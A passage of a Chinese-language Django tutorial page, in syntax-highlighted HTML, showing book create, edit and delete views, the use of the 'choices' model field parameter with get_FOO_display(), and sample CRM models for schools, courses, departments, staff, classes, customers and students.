    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;POST&apos;</span>:
        <span class="hljs-comment"># &#x83B7;&#x53D6;&#x524D;&#x7AEF;&#x63D0;&#x4EA4;&#x8FC7;&#x6765;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;</span>
        title = request.POST.get(<span class="hljs-string">&quot;title&quot;</span>)
        price = request.POST.get(<span class="hljs-string">&quot;price&quot;</span>)
        publish_date = request.POST.get(<span class="hljs-string">&quot;publish_date&quot;</span>)
        publish_id = request.POST.get(<span class="hljs-string">&quot;publish&quot;</span>)
        authors_list = request.POST.getlist(<span class="hljs-string">&quot;authors&quot;</span>)  <span class="hljs-comment"># [1,2,3,4,]</span>
        <span class="hljs-comment"># &#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x5B58;&#x50A8;&#x6570;&#x636E;</span>
        <span class="hljs-comment"># &#x4E66;&#x7C4D;&#x8868;</span>
        book_obj = models.Book.objects.create(title=title,price=price,publish_date=publish_date,publish_id=publish_id)
        <span class="hljs-comment"># &#x4E66;&#x7C4D;&#x4E0E;&#x4F5C;&#x8005;&#x7684;&#x5173;&#x7CFB;&#x8868;</span>
        book_obj.authors.add(*authors_list)
        <span class="hljs-comment"># &#x8DF3;&#x8F6C;&#x5230;&#x4E66;&#x7C4D;&#x7684;&#x5C55;&#x793A;&#x9875;&#x9762;</span>
        <span class="hljs-string">&quot;&quot;&quot;
        redirect&#x62EC;&#x53F7;&#x5185;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;url
        &#x5176;&#x5B9E;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x522B;&#x540D;

        &#x4F46;&#x662F;&#x5982;&#x679C;&#x4F60;&#x7684;&#x522B;&#x540D;&#x9700;&#x8981;&#x989D;&#x5916;&#x7ED9;&#x53C2;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5FC5;&#x987B;&#x4F7F;&#x7528;reverse&#x89E3;&#x6790;&#x4E86;
        &quot;&quot;&quot;</span>
        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&apos;book_list&apos;</span>)


    <span class="hljs-comment"># &#x5148;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x51FA;&#x7248;&#x793E;&#x4FE1;&#x606F;&#x548C;&#x4F5C;&#x8005;&#x4FE1;&#x606F;</span>
    publish_queryset = models.Publish.objects.all()
    author_queryset = models.Author.objects.all()
    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;book_add.html&apos;</span>,locals())


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">book_edit</span><span class="hljs-params">(request,edit_id)</span>:</span>
    <span class="hljs-comment"># &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7528;&#x6237;&#x60F3;&#x8981;&#x7F16;&#x8F91;&#x7684;&#x4E66;&#x7C4D;&#x5BF9;&#x8C61; &#x5C55;&#x793A;&#x7ED9;&#x7528;&#x6237;&#x770B;</span>
    edit_obj = models.Book.objects.filter(pk=edit_id).first()
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;POST&apos;</span>:
        title = request.POST.get(<span class="hljs-string">&quot;title&quot;</span>)
        price = request.POST.get(<span class="hljs-string">&quot;price&quot;</span>)
        publish_date = request.POST.get(<span class="hljs-string">&quot;publish_date&quot;</span>)
        publish_id = request.POST.get(<span class="hljs-string">&quot;publish&quot;</span>)
        authors_list = request.POST.getlist(<span class="hljs-string">&quot;authors&quot;</span>)  <span class="hljs-comment"># [1,2,3,4,]</span>
        models.Book.objects.filter(pk=edit_id).update(title=title,
                                                      price=price,
                                                      publish_date=publish_date,
                                                      publish_id=publish_id
                                                      )
        <span class="hljs-comment"># &#x8BE5;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;</span>
        edit_obj.authors.set(authors_list)
        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&apos;book_list&apos;</span>)

    publish_queryset = models.Publish.objects.all()
    author_queryset = models.Author.objects.all()
    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;book_edit.html&apos;</span>,locals())


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">book_delete</span><span class="hljs-params">(request,delete_id)</span>:</span>
    <span class="hljs-comment"># &#x7B80;&#x5355;&#x7C97;&#x66B4; &#x76F4;&#x63A5;&#x5220;&#x9664;</span>
    models.Book.objects.filter(pk=delete_id).delete()
    <span class="hljs-comment"># &#x76F4;&#x63A5;&#x8DF3;&#x8F6C;&#x5230;&#x5C55;&#x793A;&#x9875;</span>
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&apos;book_list&apos;</span>)
</code></pre>
<h4 id="choices&#x53C2;&#x6570;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x6BB5;&#x8BBE;&#x8BA1;&#x5E38;&#x89C1;">choices&#x53C2;&#x6570;(&#x6570;&#x636E;&#x5E93;&#x5B57;&#x6BB5;&#x8BBE;&#x8BA1;&#x5E38;&#x89C1;)</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x7528;&#x6237;&#x8868;    
    &#x6027;&#x522B;
    &#x5B66;&#x5386;
    &#x5DE5;&#x4F5C;&#x7ECF;&#x9A8C;
    &#x662F;&#x5426;&#x7ED3;&#x5A5A;
    &#x662F;&#x5426;&#x751F;&#x5B50;
    &#x5BA2;&#x6237;&#x6765;&#x6E90;
    ...
&#x9488;&#x5BF9;&#x67D0;&#x4E2A;&#x53EF;&#x4EE5;&#x5217;&#x4E3E;&#x5B8C;&#x5168;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x5B57;&#x6BB5;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5982;&#x4F55;&#x5B58;&#x50A8;

&#x53EA;&#x8981;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x662F;&#x53EF;&#x4EE5;&#x5217;&#x4E3E;&#x5B8C;&#x5168;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x4F1A;&#x91C7;&#x7528;choices&#x53C2;&#x6570;
&quot;&quot;&quot;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>
    username = models.CharField(max_length=<span class="hljs-number">32</span>)
    age = models.IntegerField()
    <span class="hljs-comment"># &#x6027;&#x522B;</span>
    gender_choices = (
        (<span class="hljs-number">1</span>,<span class="hljs-string">&apos;&#x7537;&apos;</span>),
        (<span class="hljs-number">2</span>,<span class="hljs-string">&apos;&#x5973;&apos;</span>),
        (<span class="hljs-number">3</span>,<span class="hljs-string">&apos;&#x5176;&#x4ED6;&apos;</span>),
    )
    gender = models.IntegerField(choices=gender_choices)

    score_choices = (
        (<span class="hljs-string">&apos;A&apos;</span>,<span class="hljs-string">&apos;&#x4F18;&#x79C0;&apos;</span>),
        (<span class="hljs-string">&apos;B&apos;</span>,<span class="hljs-string">&apos;&#x826F;&#x597D;&apos;</span>),
        (<span class="hljs-string">&apos;C&apos;</span>,<span class="hljs-string">&apos;&#x53CA;&#x683C;&apos;</span>),
        (<span class="hljs-string">&apos;D&apos;</span>,<span class="hljs-string">&apos;&#x4E0D;&#x5408;&#x683C;&apos;</span>),
    )
    <span class="hljs-comment"># &#x4FDD;&#x8BC1;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x8DDF;&#x5217;&#x4E3E;&#x51FA;&#x6765;&#x7684;&#x5143;&#x7956;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E00;&#x81F4;&#x5373;&#x53EF;</span>
    score = models.CharField(choices=score_choices,null=<span class="hljs-keyword">True</span>)
    <span class="hljs-string">&quot;&quot;&quot;
    &#x8BE5;gender&#x5B57;&#x6BB5;&#x5B58;&#x7684;&#x8FD8;&#x662F;&#x6570;&#x5B57; &#x4F46;&#x662F;&#x5982;&#x679C;&#x5B58;&#x7684;&#x6570;&#x5B57;&#x5728;&#x4E0A;&#x9762;&#x5143;&#x7956;&#x5217;&#x4E3E;&#x7684;&#x8303;&#x56F4;&#x4E4B;&#x5185;
    &#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x8F7B;&#x677E;&#x7684;&#x83B7;&#x53D6;&#x5230;&#x6570;&#x5B57;&#x5BF9;&#x5E94;&#x7684;&#x771F;&#x6B63;&#x7684;&#x5185;&#x5BB9;

    1.gender&#x5B57;&#x6BB5;&#x5B58;&#x7684;&#x6570;&#x5B57;&#x4E0D;&#x5728;&#x4E0A;&#x8FF0;&#x5143;&#x7956;&#x5217;&#x4E3E;&#x7684;&#x8303;&#x56F4;&#x5185;&#x5BB9;
    2.&#x5982;&#x679C;&#x5728; &#x5982;&#x4F55;&#x83B7;&#x53D6;&#x5BF9;&#x5E94;&#x7684;&#x4E2D;&#x6587;&#x4FE1;&#x606F;
    &quot;&quot;&quot;</span>


    <span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> models
    <span class="hljs-comment"># models.User.objects.create(username=&apos;jason&apos;,age=18,gender=1)</span>
    <span class="hljs-comment"># models.User.objects.create(username=&apos;egon&apos;,age=85,gender=2)</span>
    <span class="hljs-comment"># models.User.objects.create(username=&apos;tank&apos;,age=40,gender=3)</span>
    <span class="hljs-comment"># &#x5B58;&#x7684;&#x65F6;&#x5019; &#x6CA1;&#x6709;&#x5217;&#x4E3E;&#x51FA;&#x6765;&#x7684;&#x6570;&#x5B57;&#x4E5F;&#x80FD;&#x5B58;&#xFF08;&#x8303;&#x56F4;&#x8FD8;&#x662F;&#x6309;&#x7167;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x51B3;&#x5B9A;&#xFF09;</span>
    <span class="hljs-comment"># models.User.objects.create(username=&apos;tony&apos;,age=45,gender=4)</span>

    <span class="hljs-comment"># &#x53D6;</span>
    <span class="hljs-comment"># user_obj = models.User.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># print(user_obj.gender)</span>
    <span class="hljs-comment"># &#x53EA;&#x8981;&#x662F;choices&#x53C2;&#x6570;&#x7684;&#x5B57;&#x6BB5; &#x5982;&#x679C;&#x4F60;&#x60F3;&#x8981;&#x83B7;&#x53D6;&#x5BF9;&#x5E94;&#x4FE1;&#x606F; &#x56FA;&#x5B9A;&#x5199;&#x6CD5; get_&#x5B57;&#x6BB5;&#x540D;_display()</span>
    <span class="hljs-comment"># print(user_obj.get_gender_display())</span>

    user_obj = models.User.objects.filter(pk=<span class="hljs-number">4</span>).first()
    <span class="hljs-comment"># &#x5982;&#x679C;&#x6CA1;&#x6709;&#x5BF9;&#x5E94;&#x5173;&#x7CFB; &#x90A3;&#x4E48;&#x5B57;&#x6BB5;&#x662F;&#x4EC0;&#x4E48;&#x8FD8;&#x662F;&#x5C55;&#x793A;&#x4EC0;&#x4E48;</span>
    print(user_obj.get_gender_display())  <span class="hljs-comment"># 4</span>


<span class="hljs-comment"># &#x5B9E;&#x9645;&#x9879;&#x76EE;&#x6848;&#x4F8B;</span>
<span class="hljs-comment"># CRM&#x76F8;&#x5173;&#x5185;&#x90E8;&#x8868;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">School</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x6821;&#x533A;&#x8868;
    &#x5982;&#xFF1A;
        &#x5317;&#x4EAC;&#x6C99;&#x6CB3;&#x6821;&#x533A;
        &#x4E0A;&#x6D77;&#x6821;&#x533A;

    &quot;&quot;&quot;</span>
    title = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x6821;&#x533A;&#x540D;&#x79F0;&apos;</span>, max_length=<span class="hljs-number">32</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.title

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Course</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x8BFE;&#x7A0B;&#x8868;
    &#x5982;&#xFF1A;
        Linux&#x57FA;&#x7840;
        Linux&#x67B6;&#x6784;&#x5E08;
        Python&#x81EA;&#x52A8;&#x5316;&#x5F00;&#x53D1;&#x7CBE;&#x82F1;&#x73ED;
        Python&#x81EA;&#x52A8;&#x5316;&#x5F00;&#x53D1;&#x67B6;&#x6784;&#x5E08;&#x73ED;
        Python&#x57FA;&#x7840;&#x73ED;
        go&#x57FA;&#x7840;&#x73ED;
    &quot;&quot;&quot;</span>
    name = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&apos;</span>, max_length=<span class="hljs-number">32</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.name

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Department</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x90E8;&#x95E8;&#x8868;
    &#x5E02;&#x573A;&#x90E8;     1000
    &#x9500;&#x552E;       1001

    &quot;&quot;&quot;</span>
    title = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x90E8;&#x95E8;&#x540D;&#x79F0;&apos;</span>, max_length=<span class="hljs-number">16</span>)
    code = models.IntegerField(verbose_name=<span class="hljs-string">&apos;&#x90E8;&#x95E8;&#x7F16;&#x53F7;&apos;</span>, unique=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">False</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.title

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5458;&#x5DE5;&#x8868;
    &quot;&quot;&quot;</span>

    name = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x5458;&#x5DE5;&#x59D3;&#x540D;&apos;</span>, max_length=<span class="hljs-number">16</span>)
    email = models.EmailField(verbose_name=<span class="hljs-string">&apos;&#x90AE;&#x7BB1;&apos;</span>, max_length=<span class="hljs-number">64</span>)
    depart = models.ForeignKey(verbose_name=<span class="hljs-string">&apos;&#x90E8;&#x95E8;&apos;</span>, to=<span class="hljs-string">&quot;Department&quot;</span>,to_field=<span class="hljs-string">&quot;code&quot;</span>)
    user=models.OneToOneField(<span class="hljs-string">&quot;User&quot;</span>,default=<span class="hljs-number">1</span>)
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.name

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassList</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x73ED;&#x7EA7;&#x8868;
    &#x5982;&#xFF1A;
        Python&#x5168;&#x6808;  &#x9762;&#x6388;&#x73ED;  5&#x671F;  10000  2017-11-11  2018-5-11
    &quot;&quot;&quot;</span>
    school = models.ForeignKey(verbose_name=<span class="hljs-string">&apos;&#x6821;&#x533A;&apos;</span>, to=<span class="hljs-string">&apos;School&apos;</span>)
    course = models.ForeignKey(verbose_name=<span class="hljs-string">&apos;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&apos;</span>, to=<span class="hljs-string">&apos;Course&apos;</span>)
    semester = models.IntegerField(verbose_name=<span class="hljs-string">&quot;&#x73ED;&#x7EA7;(&#x671F;)&quot;</span>)


    price = models.IntegerField(verbose_name=<span class="hljs-string">&quot;&#x5B66;&#x8D39;&quot;</span>)
    start_date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x5F00;&#x73ED;&#x65E5;&#x671F;&quot;</span>)
    graduate_date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x7ED3;&#x4E1A;&#x65E5;&#x671F;&quot;</span>, null=<span class="hljs-keyword">True</span>, blank=<span class="hljs-keyword">True</span>)
    memo = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x8BF4;&#x660E;&apos;</span>, max_length=<span class="hljs-number">256</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>, )

    teachers = models.ManyToManyField(verbose_name=<span class="hljs-string">&apos;&#x4EFB;&#x8BFE;&#x8001;&#x5E08;&apos;</span>, to=<span class="hljs-string">&apos;UserInfo&apos;</span>,limit_choices_to={<span class="hljs-string">&apos;depart&apos;</span>:<span class="hljs-number">1002</span>})
    tutor = models.ForeignKey(verbose_name=<span class="hljs-string">&apos;&#x73ED;&#x4E3B;&#x4EFB;&apos;</span>, to=<span class="hljs-string">&apos;UserInfo&apos;</span>,related_name=<span class="hljs-string">&quot;class_list&quot;</span>,limit_choices_to={<span class="hljs-string">&apos;depart&apos;</span>:<span class="hljs-number">1006</span>})


    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;{0}({1}&#x671F;)&quot;</span>.format(self.course.name, self.semester)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Customer</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5BA2;&#x6237;&#x8868;
    &quot;&quot;&quot;</span>
    qq = models.CharField(verbose_name=<span class="hljs-string">&apos;qq&apos;</span>, max_length=<span class="hljs-number">64</span>, unique=<span class="hljs-keyword">True</span>, help_text=<span class="hljs-string">&apos;QQ&#x53F7;&#x5FC5;&#x987B;&#x552F;&#x4E00;&apos;</span>)

    name = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x5B66;&#x751F;&#x59D3;&#x540D;&apos;</span>, max_length=<span class="hljs-number">16</span>)
    gender_choices = ((<span class="hljs-number">1</span>, <span class="hljs-string">&apos;&#x7537;&apos;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&apos;&#x5973;&apos;</span>))
    gender = models.SmallIntegerField(verbose_name=<span class="hljs-string">&apos;&#x6027;&#x522B;&apos;</span>, choices=gender_choices)

    education_choices = (
        (<span class="hljs-number">1</span>, <span class="hljs-string">&apos;&#x91CD;&#x70B9;&#x5927;&#x5B66;&apos;</span>),
        (<span class="hljs-number">2</span>, <span class="hljs-string">&apos;&#x666E;&#x901A;&#x672C;&#x79D1;&apos;</span>),
        (<span class="hljs-number">3</span>, <span class="hljs-string">&apos;&#x72EC;&#x7ACB;&#x9662;&#x6821;&apos;</span>),
        (<span class="hljs-number">4</span>, <span class="hljs-string">&apos;&#x6C11;&#x529E;&#x672C;&#x79D1;&apos;</span>),
        (<span class="hljs-number">5</span>, <span class="hljs-string">&apos;&#x5927;&#x4E13;&apos;</span>),
        (<span class="hljs-number">6</span>, <span class="hljs-string">&apos;&#x6C11;&#x529E;&#x4E13;&#x79D1;&apos;</span>),
        (<span class="hljs-number">7</span>, <span class="hljs-string">&apos;&#x9AD8;&#x4E2D;&apos;</span>),
        (<span class="hljs-number">8</span>, <span class="hljs-string">&apos;&#x5176;&#x4ED6;&apos;</span>)
    )
    education = models.IntegerField(verbose_name=<span class="hljs-string">&apos;&#x5B66;&#x5386;&apos;</span>, choices=education_choices, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>, )
    graduation_school = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x6BD5;&#x4E1A;&#x5B66;&#x6821;&apos;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    major = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x6240;&#x5B66;&#x4E13;&#x4E1A;&apos;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)

    experience_choices = [
        (<span class="hljs-number">1</span>, <span class="hljs-string">&apos;&#x5728;&#x6821;&#x751F;&apos;</span>),
        (<span class="hljs-number">2</span>, <span class="hljs-string">&apos;&#x5E94;&#x5C4A;&#x6BD5;&#x4E1A;&apos;</span>),
        (<span class="hljs-number">3</span>, <span class="hljs-string">&apos;&#x534A;&#x5E74;&#x4EE5;&#x5185;&apos;</span>),
        (<span class="hljs-number">4</span>, <span class="hljs-string">&apos;&#x534A;&#x5E74;&#x81F3;&#x4E00;&#x5E74;&apos;</span>),
        (<span class="hljs-number">5</span>, <span class="hljs-string">&apos;&#x4E00;&#x5E74;&#x81F3;&#x4E09;&#x5E74;&apos;</span>),
        (<span class="hljs-number">6</span>, <span class="hljs-string">&apos;&#x4E09;&#x5E74;&#x81F3;&#x4E94;&#x5E74;&apos;</span>),
        (<span class="hljs-number">7</span>, <span class="hljs-string">&apos;&#x4E94;&#x5E74;&#x4EE5;&#x4E0A;&apos;</span>),
    ]
    experience = models.IntegerField(verbose_name=<span class="hljs-string">&apos;&#x5DE5;&#x4F5C;&#x7ECF;&#x9A8C;&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>, choices=experience_choices)
    work_status_choices = [
        (<span class="hljs-number">1</span>, <span class="hljs-string">&apos;&#x5728;&#x804C;&apos;</span>),
        (<span class="hljs-number">2</span>, <span class="hljs-string">&apos;&#x65E0;&#x4E1A;&apos;</span>)
    ]
    work_status = models.IntegerField(verbose_name=<span class="hljs-string">&quot;&#x804C;&#x4E1A;&#x72B6;&#x6001;&quot;</span>, choices=work_status_choices, default=<span class="hljs-number">1</span>, blank=<span class="hljs-keyword">True</span>,
                                      null=<span class="hljs-keyword">True</span>)
    company = models.CharField(verbose_name=<span class="hljs-string">&quot;&#x76EE;&#x524D;&#x5C31;&#x804C;&#x516C;&#x53F8;&quot;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    salary = models.CharField(verbose_name=<span class="hljs-string">&quot;&#x5F53;&#x524D;&#x85AA;&#x8D44;&quot;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)

    source_choices = [
        (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;qq&#x7FA4;&quot;</span>),
        (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;&#x5185;&#x90E8;&#x8F6C;&#x4ECB;&#x7ECD;&quot;</span>),
        (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&quot;</span>),
        (<span class="hljs-number">4</span>, <span class="hljs-string">&quot;&#x767E;&#x5EA6;&#x63A8;&#x5E7F;&quot;</span>),
        (<span class="hljs-number">5</span>, <span class="hljs-string">&quot;360&#x63A8;&#x5E7F;&quot;</span>),
        (<span class="hljs-number">6</span>, <span class="hljs-string">&quot;&#x641C;&#x72D7;&#x63A8;&#x5E7F;&quot;</span>),
        (<span class="hljs-number">7</span>, <span class="hljs-string">&quot;&#x817E;&#x8BAF;&#x8BFE;&#x5802;&quot;</span>),
        (<span class="hljs-number">8</span>, <span class="hljs-string">&quot;&#x5E7F;&#x70B9;&#x901A;&quot;</span>),
        (<span class="hljs-number">9</span>, <span class="hljs-string">&quot;&#x9AD8;&#x6821;&#x5BA3;&#x8BB2;&quot;</span>),
        (<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&#x6E20;&#x9053;&#x4EE3;&#x7406;&quot;</span>),
        (<span class="hljs-number">11</span>, <span class="hljs-string">&quot;51cto&quot;</span>),
        (<span class="hljs-number">12</span>, <span class="hljs-string">&quot;&#x667A;&#x6C47;&#x63A8;&quot;</span>),
        (<span class="hljs-number">13</span>, <span class="hljs-string">&quot;&#x7F51;&#x76DF;&quot;</span>),
        (<span class="hljs-number">14</span>, <span class="hljs-string">&quot;DSP&quot;</span>),
        (<span class="hljs-number">15</span>, <span class="hljs-string">&quot;SEO&quot;</span>),
        (<span class="hljs-number">16</span>, <span class="hljs-string">&quot;&#x5176;&#x5B83;&quot;</span>),
    ]
    source = models.SmallIntegerField(<span class="hljs-string">&apos;&#x5BA2;&#x6237;&#x6765;&#x6E90;&apos;</span>, choices=source_choices, default=<span class="hljs-number">1</span>)
    referral_from = models.ForeignKey(
        <span class="hljs-string">&apos;self&apos;</span>,
        blank=<span class="hljs-keyword">True</span>,
        null=<span class="hljs-keyword">True</span>,
        verbose_name=<span class="hljs-string">&quot;&#x8F6C;&#x4ECB;&#x7ECD;&#x81EA;&#x5B66;&#x5458;&quot;</span>,
        help_text=<span class="hljs-string">&quot;&#x82E5;&#x6B64;&#x5BA2;&#x6237;&#x662F;&#x8F6C;&#x4ECB;&#x7ECD;&#x81EA;&#x5185;&#x90E8;&#x5B66;&#x5458;,&#x8BF7;&#x5728;&#x6B64;&#x5904;&#x9009;&#x62E9;&#x5185;&#x90E8;&#x5B66;&#x5458;&#x59D3;&#x540D;&quot;</span>,
        related_name=<span class="hljs-string">&quot;internal_referral&quot;</span>
    )
    course = models.ManyToManyField(verbose_name=<span class="hljs-string">&quot;&#x54A8;&#x8BE2;&#x8BFE;&#x7A0B;&quot;</span>, to=<span class="hljs-string">&quot;Course&quot;</span>)

    status_choices = [
        (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&#x5DF2;&#x62A5;&#x540D;&quot;</span>),
        (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;&#x672A;&#x62A5;&#x540D;&quot;</span>)
    ]
    status = models.IntegerField(
        verbose_name=<span class="hljs-string">&quot;&#x72B6;&#x6001;&quot;</span>,
        choices=status_choices,
        default=<span class="hljs-number">2</span>,
        help_text=<span class="hljs-string">u&quot;&#x9009;&#x62E9;&#x5BA2;&#x6237;&#x6B64;&#x65F6;&#x7684;&#x72B6;&#x6001;&quot;</span>
    )

    consultant = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x8BFE;&#x7A0B;&#x987E;&#x95EE;&quot;</span>, to=<span class="hljs-string">&apos;UserInfo&apos;</span>, related_name=<span class="hljs-string">&apos;consultanter&apos;</span>,limit_choices_to={<span class="hljs-string">&apos;depart&apos;</span>:<span class="hljs-number">1001</span>})

    date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x54A8;&#x8BE2;&#x65E5;&#x671F;&quot;</span>, auto_now_add=<span class="hljs-keyword">True</span>)
    recv_date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x5F53;&#x524D;&#x8BFE;&#x7A0B;&#x987E;&#x95EE;&#x7684;&#x63A5;&#x5355;&#x65E5;&#x671F;&quot;</span>, null=<span class="hljs-keyword">True</span>)
    last_consult_date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x6700;&#x540E;&#x8DDF;&#x8FDB;&#x65E5;&#x671F;&quot;</span>, )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.name

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConsultRecord</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5BA2;&#x6237;&#x8DDF;&#x8FDB;&#x8BB0;&#x5F55;
    &quot;&quot;&quot;</span>
    customer = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x6240;&#x54A8;&#x8BE2;&#x5BA2;&#x6237;&quot;</span>, to=<span class="hljs-string">&apos;Customer&apos;</span>)
    consultant = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x8DDF;&#x8E2A;&#x4EBA;&quot;</span>, to=<span class="hljs-string">&apos;UserInfo&apos;</span>,limit_choices_to={<span class="hljs-string">&apos;depart&apos;</span>:<span class="hljs-number">1001</span>})
    date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x8DDF;&#x8FDB;&#x65E5;&#x671F;&quot;</span>, auto_now_add=<span class="hljs-keyword">True</span>)
    note = models.TextField(verbose_name=<span class="hljs-string">&quot;&#x8DDF;&#x8FDB;&#x5185;&#x5BB9;...&quot;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.customer.name + <span class="hljs-string">&quot;:&quot;</span> + self.consultant.name

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5B66;&#x751F;&#x8868;&#xFF08;&#x5DF2;&#x62A5;&#x540D;&#xFF09;
    &quot;&quot;&quot;</span>
    customer = models.OneToOneField(verbose_name=<span class="hljs-string">&apos;&#x5BA2;&#x6237;&#x4FE1;&#x606F;&apos;</span>, to=<span class="hljs-string">&apos;Customer&apos;</span>)
    class_list = models.ManyToManyField(verbose_name=<span class="hljs-string">&quot;&#x5DF2;&#x62A5;&#x73ED;&#x7EA7;&quot;</span>, to=<span class="hljs-string">&apos;ClassList&apos;</span>, blank=<span class="hljs-keyword">True</span>)

